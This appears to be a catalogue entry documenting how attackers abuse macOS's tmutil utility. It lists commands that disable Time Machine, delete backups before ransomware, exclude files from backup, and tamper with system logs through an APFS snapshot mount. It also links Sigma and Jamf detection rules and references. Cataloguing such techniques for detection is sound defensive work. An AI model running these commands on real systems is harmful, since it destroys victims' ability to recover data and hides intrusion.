---
trust_level: community
id: macos-impact-tmutil
namespace: macos:impact:tmutil
name: tmutil
description: Manage Time Machine backups.
author: Brendan Chamberlain (@infosecB)
version: "1.0.0"
capabilities:
  - impact.destruction
  - collection.data
  - security.privilegeescalation.shell
  - security.defenseevasion.bypass
platforms:
  - macos
techniques:
  - impact
  - collection
  - privilege-escalation
  - defense-evasion
execution:
  template: "tmutil"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
  - description: "Disable Time Machine: The following command disables Time Machine. An attacker can use this to prevent backups from occurring."
    command: "tmutil disable"
  - description: "Delete a backup: The following command deletes the specified backup. An adversary may perform this action before launching a ransomware attack to prevent the victim from restoring their files."
    command: "tmutil delete /path/to/backup"
  - description: "Restore a backup: The following command restore the specified backup. An attacker can use this to restore a backup of a sensitive file that was deleted."
    command: "tmutil restore /path/to/backup"
  - description: "Tamper with system logs: An adversary can use the snapshot and restore commands together to tamper with system logs. This is fixed in macOS 10.15.4+."
    command: "mkdir /tmp/snapshot\ntmutil localsnapshot\ntmutil listlocalsnapshots /\nmount_apfs -o noowners -s com.apple.TimeMachine.2023-05-01-090000.local /System/Volumes/Data /tmp/snapshot\nopen /tmp/snapshot\nsudo vim /var/log/system.log\ntmutil restore com.apple.TimeMachine.2023-05-01-090000.local"
  - description: "Exclude path from backup: An adversary could exclude a path from Time Machine backups to prevent certain files from being backed up."
    command: "tmutil addexclusion /path/to/exclude"
install:
  - method: custom
    commands:
      - "/usr/bin/tmutil"
detections:
  - type: other
    url: "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/tmutil_activity"
    description: "Jamf Protect: Detect the deletion of localsnapshots"
  - type: sigma
    url: "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_tmutil_delete_backup.yml"
    description: "Sigma: Time Machine Backup Deletion Attempt Via Tmutil - MacOS"
  - type: sigma
    url: "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_tmutil_disable_backup.yml"
    description: "Sigma: Time Machine Backup Disabled Via Tmutil - MacOS"
  - type: sigma
    url: "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_tmutil_exclude_file_from_backup.yml"
    description: "Sigma: New File Exclusion Added To Time Machine Via Tmutil - MacOS"
references:
  - label: "mount_apfs TCC bypass and privilege escalation"
    url: "https://theevilbit.github.io/posts/cve_2020_9771/"
  - label: "Manage Time Machine backups"
    url: "https://github.molgen.mpg.de/pages/bs/macOSnotes/mac/mac_files_tmutil.html"
  - label: "Living-off-the-Land: Exploring macOS LOOBins and Crafting Detection Rules - tmutil"
    url: "https://danielcortez.substack.com/p/living-off-the-land-exploring-macos-0fd"
---

A tool for managing Time Machine, the native macOS backup utility.